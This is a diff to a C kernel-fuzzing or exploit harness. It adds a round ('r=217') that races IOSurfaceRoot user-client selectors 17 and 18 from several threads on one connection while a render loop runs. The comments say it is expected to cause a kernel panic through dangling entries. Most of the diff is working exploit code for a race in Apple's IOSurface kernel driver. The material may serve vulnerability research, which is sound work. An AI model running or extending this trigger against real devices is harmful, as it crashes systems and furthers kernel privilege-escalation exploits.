@@ -1334,6 +1334,35 @@ static void *p11b_groomer(void *arg) {
     return NULL;
 }
 
+/* r=217 thread shared state */
+static volatile int r217_go = 0;
+static volatile int r217_done_count = 0;
+static io_connect_t r217_conn = IO_OBJECT_NULL;
+static int r217_iters = 500;
+
+static void *r217_worker(void *arg) {
+    int tid = (int)(uintptr_t)arg;
+    uint64_t inp[3] = {1, 2, 3};
+    while (!r217_go) ;
+    for (int i = 0; i < r217_iters; i++) {
+        mach_port_t wp = MACH_PORT_NULL;
+        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &wp);
+        mach_port_insert_right(mach_task_self(), wp, wp, MACH_MSG_TYPE_MAKE_SEND);
+        uint64_t ref = 0x217000 + (tid * 10000) + i;
+        if (tid % 2 == 0) {
+            IOConnectCallAsyncMethod(r217_conn, 17, wp, &ref, 1,
+                NULL, 0, inp, 24, NULL, NULL, NULL, NULL);
+        } else {
+            IOConnectCallMethod(r217_conn, 18, NULL, 0, inp, 24,
+                NULL, NULL, NULL, NULL);
+        }
+        mach_port_deallocate(mach_task_self(), wp);
+        usleep(50 + (tid * 10));
+    }
+    __sync_fetch_and_add(&r217_done_count, 1);
+    return NULL;
+}
+
 /* r=209 thread shared state */
 static volatile int r209_go = 0;
 static volatile int r209_stop = 0;
@@ -26315,7 +26344,78 @@ new_modes:
                 rlog("=== r=215 complete ===\n");
             }
 
-            /* r=216: Long-list traversal + MULTI-CONNECTION race
+            /* r=217: Multi-thread concurrent race + render (p11b pattern)
+             *
+             * This is the EXACT pattern that Phase 13 uses and that crashes:
+             * - Multiple threads doing concurrent sel17/sel18
+             * - Same connection, same input data {1,2,3}
+             * - Even threads register (sel17), odd threads deregister (sel18)
+             * - Render loop running concurrently
+             *
+             * The race is between async sel17 completion on one thread and
+             * sync sel18 execution on another thread, same connection.
+             *
+             * Usage: iosurface_sel17 217 [threads] [iters]
+             */
+            if (rounds == 217) {
+                rlog("\n=== r=217: Multi-thread concurrent race + render ===\n");
+                rlog("  WARNING: Expected to cause kernel panic!\n");
+                int r217_threads = 8;
+                r217_iters = 500;
+                if (argc > 3) r217_threads = atoi(argv[3]);
+                if (argc > 4) r217_iters = atoi(argv[4]);
+                if (r217_threads > 16) r217_threads = 16;
+                rlog("  Threads: %d  Iters/thread: %d\n", r217_threads, r217_iters);
+
+                io_service_t r217_svc = IOServiceGetMatchingService(kIOMasterPortDefault,
+                    IOServiceMatching("IOSurfaceRoot"));
+                if (!r217_svc) { rlog("  NO IOSurfaceRoot!\n"); goto r217_done; }
+
+                r217_conn = IO_OBJECT_NULL;
+                IOServiceOpen(r217_svc, mach_task_self(), 0, &r217_conn);
+                if (!r217_conn) { rlog("  open failed\n"); IOObjectRelease(r217_svc); goto r217_done; }
+
+                /* Start render loop FIRST */
+                rlog("  Starting render loop...\n");
+                p13_render_run = 1;
+                p13_render_frames = 0;
+                pthread_t r217_rt;
+                pthread_create(&r217_rt, NULL, p13_render_loop, NULL);
+                usleep(500000);
+                rlog("  Render active, frames=%d\n", p13_render_frames);
+
+                /* Launch race threads */
+                r217_go = 0;
+                r217_done_count = 0;
+                pthread_t r217_tids[16];
+                for (int t = 0; t < r217_threads; t++) {
+                    pthread_create(&r217_tids[t], NULL, r217_worker, (void *)(uintptr_t)t);
+                }
+                rlog("  Launched %d threads, starting race...\n", r217_threads);
+                r217_go = 1;
+
+                /* Wait for all threads to finish */
+                for (int t = 0; t < r217_threads; t++) {
+                    pthread_join(r217_tids[t], NULL);
+                }
+                rlog("  Threads done, frames=%d\n", p13_render_frames);
+
+                /* Wait for compositor to hit any dangling entries */
+                rlog("  Waiting 2s for compositor...\n");
+                usleep(2000000);
+                rlog("  SURVIVED. frames=%d\n", p13_render_frames);
+
+                p13_render_run = 0;
+                pthread_join(r217_rt, NULL);
+                rlog("  Total frames: %d\n", p13_render_frames);
+                IOServiceClose(r217_conn);
+                r217_conn = IO_OBJECT_NULL;
+                IOObjectRelease(r217_svc);
+                r217_done:
+                rlog("=== r=217 complete ===\n");
+            }
+
+            /* r=216: Multi-thread register/deregister race with real surfaces
              *
              * Uses two connections to the same IOSurfaceRoot. Registers
              * entries on conn1, then rapidly deregisters on conn2 while
